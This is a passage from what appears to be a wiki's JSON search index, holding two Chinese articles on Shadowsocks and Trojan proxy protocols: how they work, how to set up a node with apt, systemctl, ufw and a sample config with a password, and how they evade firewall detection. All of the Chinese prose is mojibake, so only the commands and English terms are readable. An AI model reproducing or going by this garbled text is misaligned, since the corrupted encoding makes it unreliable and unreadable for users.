---------------------------------------------------------------------------"},{"title":"shadowsocksåŸç†ä¸èŠ‚ç‚¹æ­å»º","path":"/wiki/Proxy_Protocols/shadowsocksåŸç†ä¸èŠ‚ç‚¹æ­å»º.html","content":"Shadowsocks ä½¿ç”¨ssä»£ç†ä¸‹çš„æµè§ˆå™¨è¯·æ±‚è¿‡ç¨‹ ä½¿ç”¨shdowsocksä»£ç†åè®®èŠ‚ç‚¹è¿›è¡Œç§‘å­¦ä¸Šç½‘ï¼Œæµè§ˆå™¨çš„è¯·æ±‚è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š æµè§ˆå™¨ç”Ÿæˆè¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚é¦–å…ˆåœ¨åº”ç”¨å±‚ï¼ˆä¾‹å¦‚HTTPè¯·æ±‚ï¼‰è¢«åˆ›å»ºã€‚ ç„¶åï¼Œè¿™ä¸ªè¯·æ±‚æŒ‰ç…§åè®®æ ˆå‘ä¸‹ï¼Œé€šè¿‡ä¼ è¾“å±‚ï¼ˆé€šå¸¸æ˜¯TCPï¼‰ï¼Œç½‘ç»œå±‚ï¼ˆIPå±‚ï¼‰ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œæœ€åæ˜¯ç‰©ç†å±‚ï¼Œè¿™æ ·æ•°æ®åŒ…å°±å‡†å¤‡å¥½åœ¨æœ¬åœ°ç½‘ç»œä¸Šå‘é€äº†ã€‚ ç”±äºç½‘ç»œé…ç½®ä¸­è®¾ç½®äº†ä»£ç†ï¼Œè¿™ä¸ªæ•°æ®åŒ…ä¸ä¼šç›´æ¥å‘é€åˆ°äº’è”ç½‘ä¸Šï¼Œè€Œæ˜¯å‘é€åˆ°æœ¬åœ°çš„ç›‘å¬ç«¯å£1080ï¼Œè¿™æ˜¯ss-localç›‘å¬çš„ç«¯å£ã€‚ ss-localæ¥æ”¶åˆ°è¿™ä¸ªæ•°æ®åŒ…åï¼Œåœ¨åº”ç”¨å±‚å¯¹å…¶å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå°è£…æˆShadowsocksåè®®æ ¼å¼çš„æ•°æ®åŒ…ã€‚ åŠ å¯†åçš„æ•°æ®åŒ…å†æ¬¡é€šè¿‡åè®®æ ˆï¼šä»åº”ç”¨å±‚åˆ°ä¼ è¾“å±‚ï¼ˆé€šå¸¸æ˜¯TCPï¼‰ï¼Œç½‘ç»œå±‚ï¼ˆIPå±‚ï¼‰ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç‰©ç†å±‚ï¼Œç„¶åå‘é€åˆ°äº’è”ç½‘ä¸Šï¼Œåˆ°è¾¾ss-serveræœåŠ¡å™¨ã€‚ ss-serveræœåŠ¡å™¨è§£å¯†æ•°æ®åŒ…ï¼Œæ¢å¤æˆåŸå§‹çš„HTTPæˆ–HTTPSè¯·æ±‚ï¼Œå¹¶å°†è¯¥è¯·æ±‚å‘é€åˆ°ç›®æ ‡ç½‘ç«™ã€‚ æœåŠ¡å™¨æ”¶åˆ°æ¥è‡ªgoogle.comçš„å“åº”åï¼Œss-serverå°†å“åº”æ•°æ®åŠ å¯†å¹¶å‘é€å›ss-localã€‚ ss-localå†æ¬¡è§£å¯†è¿™äº›æ•°æ®ï¼Œå¹¶å°†åŸå§‹çš„å“åº”æ•°æ®å‘é€å›æµè§ˆå™¨ï¼Œå®Œæˆæ•´ä¸ªè¯·æ±‚å’Œå“åº”çš„è¿‡ç¨‹ã€‚ åœ¨æµè§ˆå™¨è¯·æ±‚å‘é€çš„è¿‡ç¨‹ä¸­ï¼Œss-localä½œä¸ºä»£ç†å®¢æˆ·ç«¯åœ¨åº”ç”¨å±‚è¿›è¡ŒåŠ å¯†å¤„ç†ï¼›åœ¨æµè§ˆå™¨å“åº”æ•°æ®å‘å›çš„è¿‡ç¨‹ä¸­ï¼Œss-localä½œä¸ºä»£ç†å®¢æˆ·ç«¯åœ¨åº”ç”¨å±‚è¿›è¡Œè§£å¯†å¤„ç†ã€‚ ç®€å•æ¥è¯´ï¼Œæµè§ˆå™¨çš„è¯·æ±‚åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šç»è¿‡å®Œæ•´çš„åè®®æ ˆå°è£…åï¼Œè¢«å‘é€åˆ°æœ¬åœ°çš„ss-localä»£ç†ã€‚ss-localåœ¨åº”ç”¨å±‚å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼ŒåŠ å¯†åå†æ¬¡é€šè¿‡åè®®æ ˆå‘é€åˆ°äº’è”ç½‘ä¸Šã€‚ æ­å»ºssèŠ‚ç‚¹ç›¸å…³å‘½ä»¤ aptæºæ–¹å¼å®‰è£…æºç ç¼–è¯‘æ–¹å¼å®‰è£…å®‰è£…shadowsocks 1apt install shadowsocks-libevUbuntu 20.04 å®‰è£… shadowsocks-libev æœåŠ¡ç«¯ shadowsocks-libev_github_Debian &amp; Ubuntu æŸ¥çœ‹shadowsocksè¿è¡ŒçŠ¶æ€ 1systemctl status shadowsocks-libev.service ç¼–è¾‘ssé…ç½®æ–‡ä»¶ 1vim /etc/shadowsocks-libev/config.json jsonæ ¼å¼å¦‚ä¸‹ï¼š 123456789&#123; &quot;server&quot; : &quot;0.0.0.0â€, &quot;mode&quot; : &quot;tcp_and_udp&quot;, &quot;server_port&quot; :8388, &quot;local port&quot; : 1080, &quot;password&quot; : &quot;FMjzLMo700D&quot;, &quot;timeout&quot; : 86400, &quot;method&quot; : &quot;chacha20-ietf-poly1305&quot;&#125; ï¼ˆå¸¦gcmå’Œpoly1305åç¼€å°±æ˜¯å¼€å¯äº†AEADï¼‰ é‡å¯shadowsocks 1systemctl restart shadowsocks-libev.service æŸ¥çœ‹shadowsocksè¿è¡Œæ—¥å¿— 1journalctl -u shadowsocks-libev.service -f é˜²ç«å¢™ç›¸å…³é…ç½®ï¼š 123456789101112# æŸ¥çœ‹çŠ¶æ€ufw status# å¼€æ”¾ç«¯å£ufw allow 8388# æ‹’ç»ç«¯å£ufw deny 8388# åˆ é™¤è§„åˆ™ufw delete allow 8388# å…³é—­é˜²ç«å¢™ufw disable# å¯åŠ¨é˜²ç«å¢™ufw enable æŸ¥çœ‹vpsæ˜¯å¦æ”¯æŒç¡¬è§£aesï¼ˆcpuå¸¦äº†aesçš„æŒ‡ä»¤é›†ï¼Œå°±å¯ä»¥åŠ é€Ÿaesï¼‰ï¼š 1lscpu | grep aes è£¸å¥”çš„ssèŠ‚ç‚¹å­˜åœ¨è¢«æ¢æµ‹çš„å¯èƒ½æ€§ åœ¨vpsä¸Šæ”¹å¥½jsoné…ç½®æ–‡ä»¶ï¼Œé˜²ç«å¢™ç«¯å£æ”¾è¡Œåã€‚ åœ¨ç”¨æˆ·ç”µè„‘ä¸Šï¼Œç”¨ä»£ç†å®¢æˆ·ç«¯è½¯ä»¶ï¼Œå¦‚ç”¨v2rayNæ·»åŠ ssèŠ‚ç‚¹çš„æœåŠ¡å™¨ï¼Œå¡«ä¸Šipã€ç«¯å£ï¼Œpasswordï¼ŒåŠ å¯†æ–¹å¼ã€‚ åœ¨vpsä¸ŠæŸ¥çœ‹shadowsocksè¿è¡Œæ—¥å¿—ï¼Œåœ¨v2rayNæµ‹è¯•çœŸè¿æ¥ï¼ˆç”¨vpså¾€è°·æ­Œå‘é€ä¸€æ¡è¯·æ±‚ï¼‰ã€‚é€šè¿‡æ—¥å¿—æ˜¯å¦æœ‰è¾“å‡ºï¼Œæœ‰è¾“å‡ºçš„è¯çœ‹è¾“å‡ºï¼Œæ¥åˆ¤æ–­æ˜¯å“ªä¸ªç¯èŠ‚å‡ºäº†é—®é¢˜ã€‚ åœ¨æ—¥å¿—è¾“å‡ºå¯èƒ½çœ‹åˆ°æ¡æ‰‹å¤±è´¥ï¼Œé‰´æƒå¤±è´¥çš„æŠ¥é”™ 1ERROR: failed to handshake with 124.117.196.42: authentication error è¿™ä¸ªæ¥æºipä¸æ˜¯ç”¨æˆ·ç”µè„‘å‘å‡ºçš„ã€‚è¿™è¯´æ˜ï¼Œå½“ç”¨æˆ·å‘é€ssæ•°æ®åŒ…ç»è¿‡GFWæ—¶ï¼ŒGFWæ‹¿ç€è¿™ä¸ªæ•°æ®åŒ…è¿›è¡Œé‡æ”¾æ”»å‡»ï¼Œæ¢æµ‹åˆ°äº†vpsä¸Šè¿è¡Œç€shadowsocksæœåŠ¡ï¼Œæ‰€ä»¥æ–­å¼€äº†ç”¨æˆ·ä¸ssèŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè£¸å¥”çš„ssèŠ‚ç‚¹å·²ä¸å®‰å…¨ã€‚ä¸è¿‡è§†é¢‘ä¸­ä¹Ÿæåˆ°ç”¨ç”²éª¨äº‘æ­å»ºçš„ssèŠ‚ç‚¹èƒ½æ­£å¸¸ç”¨ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ä¸€äº›ipæ®µæ‰é‡‡ç”¨é‡æ”¾æ”»å‡»ã€‚ åœ¨ç°å®æƒ…å†µä¸­ï¼Œå°å‹è®¾å¤‡ï¼Œæ¯”å¦‚è·¯ç”±çš„ç”¨è¿™ç§åŸºç¡€çš„ssä¹Ÿèƒ½å‡ºå»ï¼Œä¼°è®¡GFWä¸æ‹¦è¿™äº›å°è®¾å¤‡ã€‚ å¯ä»¥è®©ssæ­é…ä½¿ç”¨v2ray-pluginè¿›è¡Œæµé‡æ··æ·†æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ shdowsocks+v2ray-plugin ä½¿ç”¨ss+pluginä¸‹çš„æµè§ˆå™¨è¯·æ±‚è¿‡ç¨‹ ss-localå°è£…æˆShadowsocksåè®®æ ¼å¼çš„æ•°æ®åŒ…åï¼Œäº¤ç»™pluginè¿›è¡Œæµé‡æ··æ·†ï¼Œæ¯”å¦‚å¢åŠ httpåè®®å¤´ï¼Œä¼ªè£…ä¸ºhttpæµé‡ã€‚ è¿‡å¢™æ—¶GFWè®¤ä¸ºæ˜¯æ­£å¸¸çš„httpæµé‡ï¼Œæ‰€ä»¥æ”¾è¡Œã€‚ æ•°æ®åŒ…åˆ°è¾¾å¢ƒå¤–vpsï¼Œç”±pluginå»æ‰httpåè®®å¤´ï¼Œç„¶åäº¤ç”±ss-serverå¤„ç†ssåè®®æ•°æ®åŒ…ã€‚ ss-serverè§£å¯†ssåè®®æ•°æ®åŒ…ï¼Œè¿˜åŸå‡ºåŸå§‹æ•°æ®åŒ…å†…å®¹ã€‚ ä¸‹å›¾å°†sså’Œpluginåˆ†å¼€ç”»ï¼Œä¾¿äºç†è§£ã€‚ å®é™…åœ¨é…ç½®è¿‡ç¨‹ä¸­ï¼Œss-localå’Œpluginéƒ½åœ¨shadowsocksç¨‹åºä¸Šå°±èƒ½å®Œæˆï¼›è¿œç«¯vpsçš„pluginå’Œss-serveråœ¨åŒä¸€å°vpsä¸Šå°±èƒ½å®Œæˆã€‚ å®‰è£…å¹¶ä½¿ç”¨v2ray-pluginæ’ä»¶ å®‰è£…v2ray-pluginæ’ä»¶ 1apt install shadowsocks-v2ray-plugin æŸ¥çœ‹å®‰è£…äº†ä»€ä¹ˆå†…å®¹ 1dpkg -L shadowsocks-v2ray-plugin ä¿®æ”¹ssçš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ æ’ä»¶ç›¸å…³çš„å‚æ•°ï¼ˆæ’ä»¶å‚æ•°æ·»åŠ è¯´æ˜ï¼‰ 1vim /etc/shadowsocks-libev/config.json ä»¥â€œShadowsocks over websocket (HTTP)â€ä¸ºä¾‹ï¼Œæ·»åŠ æ’ä»¶å‚æ•°å¦‚ä¸‹ï¼š 1234567891011&#123; &quot;server&quot; : &quot;0.0.0.0â€, &quot;mode&quot; : &quot;tcp_and_udp&quot;, &quot;server_port&quot; :8388, &quot;local port&quot; : 1080, &quot;password&quot; : &quot;FMjzLMo700D&quot;, &quot;timeout&quot; : 86400, &quot;method&quot; : &quot;chacha20-ietf-poly1305&quot;,+ &quot;plugin&quot; : &quot;v2ray-plugin&quot;,+ &quot;plugin_opts&quot; : &quot;server&quot;&#125; ä¿®æ”¹åé‡å¯shadowsocksï¼ŒæŸ¥çœ‹shadowsocksè¿è¡ŒçŠ¶æ€ v2rayNçš„ssèŠ‚ç‚¹ä¸æ”¯æŒæ’ä»¶ï¼Œè¦ç”¨shadowsocks-windowsç¨‹åºã€‚å°†shadowsocks-windowsç¨‹åºå’Œv2ray-pluginéƒ½ä¸‹è½½åï¼Œå°†v2ray-pluginç¨‹åºæ‹·åˆ°shadowsocks.exeåŒç›®å½•ä¸‹ï¼Œæ‰“å¼€shadowsocksï¼Œå¡«å†™æœåŠ¡ç«¯åœ°å€ï¼Œç«¯å£ï¼Œå¯†ç ï¼ŒåŠ å¯†æ–¹å¼ï¼Œå¡«å†™æ’ä»¶ç¨‹åºåç§°ï¼Œæ’ä»¶é€‰é¡¹ï¼ˆå°±æ˜¯å…ˆå‰åœ¨jsonå¡«å†™çš„å‚æ•°ï¼‰ï¼Œç›‘å¬ç«¯å£1080ã€‚ éšåä½¿ç”¨127.0.0.1:1080è¿›è¡Œä»£ç†ä¸Šç½‘ã€‚ ç›¸å…³é“¾æ¥ èŠ‚ç‚¹æ­å»ºç³»åˆ—(3)ï¼šSSè¢«ç²¾å‡†æ¢æµ‹ç«¯å£ç§’å°ï¼ŸèŠ‚ç‚¹æ­å»ºåˆä½“éªŒï¼Œåˆ›å»ºå¹´è½»äººçš„ç¬¬ä¸€å°VPSï¼Œshadowsocksåè®®å·²è¢«ç²¾å‡†æ¢æµ‹ï¼Ÿpluginæ’ä»¶åŸç†ï¼Œä½¿ç”¨v2ray-pluginæ’ä»¶æ‹¯æ•‘ssåè®® Item å¤‡æ³¨ v2rayN ä»£ç†å®¢æˆ·ç«¯è½¯ä»¶èƒ½å¯¹èŠ‚ç‚¹æµ‹é€Ÿï¼ˆæµ‹è¯•çœŸè¿æ¥ï¼‰ä½†ssèŠ‚ç‚¹æ— æ³•ä½¿ç”¨plugin GitHub - shadowsocks/v2ray-plugin: A SIP003 plugin based on v2ray shadowsocksæ’ä»¶ï¼Œå¯¹ssæµé‡è¿›è¡Œä¼ªè£… GitHub - shadowsocks/shadowsocks-windows: A C# port of shadowsocks Shadowsocks for Windowså®¢æˆ·ç«¯è½¯ä»¶ To do(Maybe): ä½ ä¹Ÿèƒ½å†™ä¸ª Shadowsocks Shadowsocks å®ç°åˆ†æä»¥åŠå¦‚ä½•å®ç°ä¸€ä¸ªä»£ç†åè®® å¯èƒ½æœ‰ç”¨ï¼šhttps://www.ichenxiaoyu.com/ss/ çœ‹æ˜¯å¦æ–°èµ·ä¸€ç¯‡ shdowsocksåŠ å¯†æ–¹å¼ æœ€æ—©æµæ¨¡å¼åŠ å¯†æ²¡æä¾›æ•°æ®å®Œæ•´æ€§æ ¡éªŒè€Œå­˜åœ¨å±é™©ï¼š ä½¿ç”¨ä¸»åŠ¨æ¢æµ‹æ–¹æ³•è¯†åˆ« Shadowsocks æœåŠ¡ Shadowsocksæ¼æ´å¤ç° [shadowsocksçš„é€šä¿¡åŸç†ä»¥åŠæ”»å‡»æ–¹æ³•åˆ†æ(https://wonderkun.cc/2020/02/18/shadowsocksçš„é€šä¿¡åŸç†ä»¥åŠæ”»å‡»æ–¹æ³•åˆ†æ/) æºç æ³¨é‡Šåˆ†æï¼šhttps://github.com/lixingcong/shadowsocks-analysis?tab=readme-ov-file clowwindyæœ€æ—©ç‰ˆçš„æºç ï¼šhttps://github.com/shadowsocks/shadowsocks/tree/9d3e2d717753ba9489fcd553cd444449fffb13ac å¥‡è™360ç ”ç©¶å‘˜æŠ«éœ²çš„æµæ¨¡å¼ä¸‹çš„é‡æ”¾æ”»å‡»ï¼šhttps://github.com/edwardzpeng/shadowsocks shadowsocks-orgä¸­è¯´çš„æ”¯æŒæµæ¨¡å¼å’ŒAEADæ¨¡å¼https://shadowsocks.org/doc/configs.html shadowsï¼Œgithubæœ‰ä¸€ä¸ªä¸“é—¨æ˜¯cryptoçš„ä»“åº“ï¼Œæœ‰ç©ºçœ‹çœ‹"},{"title":"trojanåŸç†ä¸èŠ‚ç‚¹æ­å»º","path":"/wiki/Proxy_Protocols/trojanåŸç†ä¸èŠ‚ç‚¹æ­å»º.html","content":"å‰ç½®çŸ¥è¯† https https:http+tls æœåŠ¡å™¨ä¼šæœ‰ä¸€å¯¹å…¬ç§é’¥ï¼Œç§é’¥ä¿ç•™ï¼Œå…¬é’¥åœ¨TLSæ¡æ‰‹æ—¶ä¼šç”¨åˆ°ã€‚å…·ä½“çš„TLSæ¡æ‰‹ç»†èŠ‚è¿™é‡Œä¸è¯¦ç»†ä»‹ç»ã€‚æ€»ä¹‹ï¼ŒTLSæ¡æ‰‹åå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åå•†å‡ºä¼šè¯çš„åŠ å¯†å¯†é’¥ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰ã€‚ è¯ä¹¦ CAæœºæ„é¢å‘ç»™åŸŸåçš„è¯ä¹¦ï¼Œæ˜¯ç”¨äºå®¢æˆ·ç«¯é‰´åˆ«æœåŠ¡ç«¯èº«ä»½ç”¨çš„ã€‚é˜²æ­¢æ”»å‡»è€…ä¼ªé€ æœåŠ¡ç«¯èº«ä»½ã€‚ å®¢æˆ·ç«¯ä¸­æœ‰ä¸ªCAæœºæ„ä¿¡ä»»åˆ—è¡¨ï¼ˆcmd-certmgr.mscï¼‰ï¼Œå®¢æˆ·ç«¯ä¼šæŸ¥çœ‹ç½‘ç«™è¯ä¹¦çš„ä¿¡ä»»é“¾ä¸Šçš„æœºæ„æ˜¯å¦åœ¨è‡ªå·±çš„ä¿¡ä»»åˆ—è¡¨ä¸Šã€‚ï¼ˆä¹Ÿå¯ä»¥è‡ªå·±åœ¨ä¿¡ä»»åˆ—è¡¨ä¸Šæ‰‹åŠ¨æ·»åŠ ä¿¡ä»»çš„æœºæ„ï¼‰ è®¿é—®httpsç½‘ç«™æ—¶å¦‚æœè¯ä¹¦æœ‰é—®é¢˜ï¼Œæµè§ˆå™¨ä¼šæŠ¥è­¦ï¼š sni ä¸€èˆ¬è€Œè¨€ï¼Œä¸€å°æœåŠ¡å™¨å¯¹åº”ç€1ä¸ªipï¼Œå¦‚æœä¸€å°æœåŠ¡å™¨ä¸ŠåŒæ—¶è¿è¡Œç€å¤šä¸ªwebç½‘é¡µï¼ˆæ‹¥æœ‰å¤šä¸ªåŸŸåï¼‰ï¼Œæ¯ä¸ªåŸŸåéƒ½æœ‰ç€å„è‡ªçš„è¯ä¹¦ã€‚å¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚æ¥æºåªæœ‰ipåœ°å€è¿™ä¸€é¡¹ä¿¡æ¯ï¼Œè¿™å°æœåŠ¡å™¨å°±æ— æ³•ç¡®å®šè®¿é—®è€…æƒ³è®¿é—®å“ªä¸ªç½‘ç«™ï¼Œä¹Ÿå°±ä¸çŸ¥é“ç”¨å“ªä¸ªç½‘ç«™çš„è¯ä¹¦è¿›è¡ŒTLSæ¡æ‰‹ã€‚ SNIå°±æ˜¯è§£å†³è¿™ç§æƒ…å†µä¸‹å¸¦æ¥çš„é—®é¢˜ï¼ŒSNIï¼ˆServer Name Indicationï¼‰æ˜¯TLSçš„æ‰©å±•ï¼Œåœ¨TLS1.2å¼€å§‹æ”¯æŒï¼Œå®ƒå…è®¸åœ¨æ¡æ‰‹è¿‡ç¨‹å¼€å§‹æ—¶é€šè¿‡å®¢æˆ·ç«¯å‘Šè¯‰å®ƒæ­£åœ¨è¿æ¥çš„æœåŠ¡å™¨çš„ä¸»æœºåç§°ã€‚ SNIä¿¡æ¯åœ¨Client Helloä¸­ç»™å‡ºï¼Œæ˜¯æ˜æ–‡ä¼ è¾“çš„ã€‚æœåŠ¡ç«¯é€šè¿‡sniè¿™ä¸ªå­—æ®µæ¥çŸ¥é“å®¢æˆ·ç«¯è¦è¿æ¥çš„ä¸»æœºåç§°ã€‚ å‚è€ƒï¼šä»€ä¹ˆæ˜¯ SNIï¼Ÿ åœ¨TLS1.3ä¸­ï¼ŒSNIè¿™ä¸ªå­—æ®µåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¹Ÿèƒ½åŠ å¯†ï¼Œç§°ä¸ºESNIã€‚ä¸è¿‡ç°åœ¨TLS1.3å¹¶ä¸æ™®åŠï¼Œå½“å«æœ‰ESNIçš„æµé‡ç»è¿‡GFWï¼ŒGFWå› ä¸ºä¸çŸ¥æ™“è®¿é—®è€…æƒ³è®¿é—®å“ªä¸ªç½‘é¡µï¼Œæ‰€ä»¥å¯¹äºæ‰€æœ‰ä½¿ç”¨ESNIçš„æ•°æ®åŒ…éƒ½è¿›è¡Œä¸¢å¼ƒã€‚ ä½¿ç”¨trojanä»£ç†ä¸‹çš„æµè§ˆå™¨è¯·æ±‚è¿‡ç¨‹ ä½¿ç”¨trojanä»£ç†åè®®èŠ‚ç‚¹è¿›è¡Œç§‘å­¦ä¸Šç½‘ï¼Œåœ¨æµè§ˆå™¨è¾“å…¥google.comçš„è¯·æ±‚è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼ˆå‡è®¾ipå·²çŸ¥ï¼ŒDNSæŸ¥è¯¢è¿‡ç¨‹ç•¥ï¼‰ï¼š æµè§ˆå™¨çš„æ•°æ®åŒ…è¯·æ±‚è¢«åˆ›å»ºï¼Œäº¤ç”±æœ¬åœ°çš„trojanä»£ç†è¿›è¡Œå¤„ç†ï¼Œæµè§ˆå™¨å’Œtrojan-localä¹‹é—´ç”¨socks5åè®® trojan-localä¸trojan-serverå»ºç«‹TCPè¿æ¥ï¼Œé€šè¿‡TLSæ¡æ‰‹åå•†å‡ºä¼šè¯åŠ å¯†å¯†é’¥ï¼Œè¯¥ä¼šè¯å¯†é’¥ç§°ä¸ºAã€‚ åå•†æˆåŠŸåï¼Œæµè§ˆå™¨é€šè¿‡trojanä»£ç†å‘google.comå‘èµ·è¯·æ±‚ï¼Œå»ºç«‹TCPè¿æ¥å’ŒTLSæ¡æ‰‹ï¼Œåå•†å‡ºä¼šè¯åŠ å¯†å¯†é’¥ï¼Œè¯¥ä¼šè¯å¯†é’¥ç§°ä¸ºBã€‚ TCPæ¡æ‰‹å’ŒTLSæ¡æ‰‹æŠ“åŒ…å›¾æµè§ˆå™¨å’ŒTrojan-localæ˜¯ç”¨socks5é€šä¿¡ï¼š123456789101112131415+-----+------+----------+----------+| CMD | ATYP | DST.ADDR | DST.PORT |+-----+------+----------+----------+| 1 | 1 | Variable | 2 |+-----+------+----------+----------+o CMD o CONNECT X&#x27;01&#x27; o UDP ï¼šX&#x27;03&#x27;o ATYP o IP V4 : X&#x27;01&#x27; o åŸŸå: X&#x27;03&#x27; o IP V6 : X&#x27;04&#x27;o DST.ADDR æ‰€éœ€çš„ç›®æ ‡åœ°å€o DST.PORT ç›®æ ‡ç«¯å£TCPæ¡æ‰‹åŒ…åºå·ï¼š73ï¼Œ74ï¼Œ75TLSæ¡æ‰‹ï¼š76ï¼Œ77ï¼Œ78ï¼Œ79ï¼Œ80ï¼Œ81ï¼Œ82ï¼Œ83ç„¶åï¼Œtrojan-localå’Œtrojan-serverä¹‹é—´å‘é€çš„æ•°æ®åŒ…æ ¼å¼å¦‚ä¸‹ï¼ˆTLSåŠ å¯†ä¹‹åçš„ï¼‰ï¼š12345+-----------------------+---------+----------------+---------+----------+| hex(SHA224(password)) | CRLF | Trojan Request | CRLF | Payload |+-----------------------+---------+----------------+---------+----------+| 56 | X&#x27;0D0A&#x27; | Variable | X&#x27;0D0A&#x27; | Variable |+-----------------------+---------+----------------+---------+----------+å‚è€ƒï¼šTrojanåè®®æµé‡åˆ†æThe Trojan Protocol | trojan (trojan-gfw.github.io) å»ºç«‹è¿æ¥åï¼Œæµè§ˆå™¨è¯·æ±‚google.comè¿”å›â€œå¦‚ä½•æˆä¸ºä¸€åé«˜æ‰‹â€çš„æŸ¥è¯¢æ•°æ®ï¼š æµè§ˆå™¨åœ¨HTTPå±‚åˆ›å»ºåŸå§‹æ•°æ®â€œå¦‚ä½•æˆä¸ºä¸€åé«˜æ‰‹â€ï¼Œäº¤ç”±TLSå±‚å¤„ç†ã€‚ åœ¨TLSå±‚ï¼Œä½¿ç”¨ä¼šè¯å¯†é’¥Aå¯¹payloadæ•°æ®åŠ å¯†ï¼ŒåŠ ä¸Šè®¿é—®çš„ipåœ°å€å’ŒSNIï¼ˆç›®æ ‡webæœåŠ¡å™¨ï¼Œgoogle.comï¼‰ã€‚ ç”±äºç½‘ç»œé…ç½®ä¸­è®¾ç½®äº†ä»£ç†ï¼Œä¸Šä¸€æ­¥éª¤çš„æ•°æ®åŒ…å‘ç»™æœ¬åœ°çš„ç›‘å¬ç«¯å£1080ï¼Œè¿™æ˜¯trojan-localç›‘å¬çš„ç«¯å£ã€‚ trojan-localæ¥æ”¶åˆ°è¿™ä¸ªæ•°æ®åŒ…ï¼Œåœ¨HTTPå±‚æ·»åŠ trojanåè®®æ•°æ®ï¼ŒåŒ…æ‹¬å¯†ç passwordç­‰ä¿¡æ¯ï¼Œäº¤ç”±TLSå±‚å¤„ç† åœ¨TLSå±‚ï¼Œä½¿ç”¨ä¼šè¯å¯†é’¥Bå¯¹payloadæ•°æ®åŠ å¯†ï¼ŒåŠ ä¸Šè®¿é—®ipå’ŒSNIï¼ˆè¿œç«¯trojanæœåŠ¡å™¨ï¼‰ã€‚ æ•°æ®åŒ…è¿‡GFWæ—¶ï¼ŒGFWçœ‹åˆ°è¿™ä¸ªæ•°æ®åŒ…æ˜¯å»å¾€217.69.7.188ï¼ˆæœªè¢«å¢™çš„vpsï¼‰ï¼ŒSNIæ˜¯example.tkï¼ˆä¸åœ¨é»‘åå•ä¸­ï¼‰ï¼Œæ”¾è¡Œ trojan-serveræ¥æ”¶åˆ°æ•°æ®åï¼Œä½¿ç”¨ä¼šè¯å¯†é’¥Bè§£å¯†æ•°æ®åŒ…ï¼Œæ ¹æ®æ˜¯å¦æ˜¯æœ‰æ•ˆçš„trojanæ•°æ®åŒ…åšåˆ†ç±»å¤„ç†ï¼š å¦‚æœæ˜¯æœ‰æ•ˆçš„trojanæ•°æ®åŒ…ï¼Œè¿›è¡Œä»£ç†åŠŸèƒ½ï¼Œå°†æ•°æ®åŒ…è½¬å‘ç»™142.250.188.14ã€‚142.250.188.14æ”¶åˆ°æ•°æ®åŒ…ï¼Œç»™google.comå¤„ç†ï¼Œgoogleç”¨ä¼šè¯å¯†é’¥Bè§£å¯†å¾—åˆ°åŸå§‹æ•°æ®ã€‚è¿”å›æ•°æ®çš„å¤„ç†è¿‡ç¨‹ä¸è¯·æ±‚ç±»ä¼¼ï¼Œè¿™é‡Œç•¥ã€‚ å¦‚æœä¸æ˜¯æœ‰æ•ˆçš„trojanæ•°æ®åŒ…ï¼ŒæœåŠ¡å™¨å°†æ–­å¼€è¿æ¥æˆ–é‡å®šå‘åˆ°ä¸€ä¸ªä¼ªè£…çš„ç½‘é¡µï¼ˆé˜²æ­¢GFWä¸»åŠ¨æ¢æµ‹ã€‚å¦‚æœGFWä¸»åŠ¨è¿æ¥ï¼Œå°†çœ‹åˆ°çš„æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘é¡µï¼‰ ä»GFWè§†è§’çœ‹ï¼šç”¨æˆ·Aæ˜¯è®¿é—®å¢ƒå¤–çš„ä¸€ä¸ªhttpsç½‘ç«™ï¼Œå¹¶ä¸”ä¸»åŠ¨æ¢æµ‹ä¹Ÿç¡®å®çœ‹åˆ°æ˜¯ä¸€ä¸ªç½‘ç«™ã€‚æ®Šä¸çŸ¥ï¼Œtrojan-serverå¯¹æ¥æºçš„å®¢æˆ·ç«¯è¯·æ±‚åšäº†åˆ¤æ–­ã€‚ TLSæ¡æ‰‹çš„å…·ä½“å…ˆåé¡ºåºå½“æµè§ˆå™¨æœ‰è®¿é—®è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªæ•°æ®åŒ…ï¼Œè¿™ä¸ªæ•°æ®åŒ…é¦–å…ˆåœ¨HTTPå±‚ç”Ÿæˆï¼Œç„¶åäº¤ç»™TLSå±‚è¿›è¡ŒåŠ å¯†ã€‚åŠ å¯†åçš„æ•°æ®åŒ…è¢«å‘é€åˆ°æœ¬åœ°çš„trojan-localä»£ç†ã€‚æ­¤æ—¶ï¼Œæ•°æ®åŒ…è¿˜æ²¡æœ‰è¢«åŠ å¯†ä¸ºæœ€ç»ˆçš„å½¢å¼ï¼Œå› ä¸ºå®ƒéœ€è¦é€šè¿‡trojan-localä¸trojan-serverä¹‹é—´çš„TLSæ¡æ‰‹æ¥ç”Ÿæˆä¼šè¯å¯†é’¥Aã€‚trojan-localä»£ç†ä¸trojan-serverå»ºç«‹TCPè¿æ¥ï¼Œå¹¶è¿›è¡ŒTLSæ¡æ‰‹ï¼Œåå•†å‡ºä¼šè¯å¯†é’¥Aã€‚è¿™ä¸ªå¯†é’¥ç”¨äºåŠ å¯†ä»trojan-localåˆ°trojan-serverçš„æµé‡ã€‚ä¸€æ—¦TLSæ¡æ‰‹å®Œæˆï¼Œtrojan-localå°±ä¼šä½¿ç”¨å¯†é’¥Aå¯¹æµè§ˆå™¨çš„åŸå§‹è¯·æ±‚æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚åŠ å¯†åçš„æ•°æ®é€šè¿‡äº’è”ç½‘å‘é€åˆ°trojan-serverã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒGFWçœ‹åˆ°çš„æ˜¯åŠ å¯†çš„æµé‡ï¼Œå®ƒæ— 